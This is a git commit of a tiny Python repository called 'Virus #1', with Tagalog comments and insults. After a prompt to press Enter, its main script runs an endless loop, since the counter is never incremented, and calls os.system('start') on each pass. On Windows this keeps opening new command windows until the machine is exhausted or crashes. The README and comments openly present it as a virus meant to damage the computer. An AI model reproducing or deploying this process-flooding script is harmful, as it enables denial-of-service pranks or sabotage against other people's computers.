8270742fccca528c3fa59fc9ac6417786fd28fd2
zept213 <pcom2007@gmail.com>
2022-08-02 14:45:32 +0800

    Initial Commit

---
+++ README.md
@@ -0,0 +1,4 @@
+# Virus #1
+
+Gago, disclaimer lang:
+	itong code na ito ang makakapinsala ng computer mo, kaya ingat lang.
---
+++ __main__.py
@@ -0,0 +1,12 @@
+# Ito ay isang virus, huwag gamitin sa mabuti.
+
+import os
+
+if __name__ == '__main__':
+    i = 1
+    input("Oh, Press enter muna bago masira buhay mo...")
+    while i < 5:
+        # DISCLAIMER: Mapupunta sa blue screen ang computer mo gago.
+        
+        print("Goodbye...")
+        os.system("start")
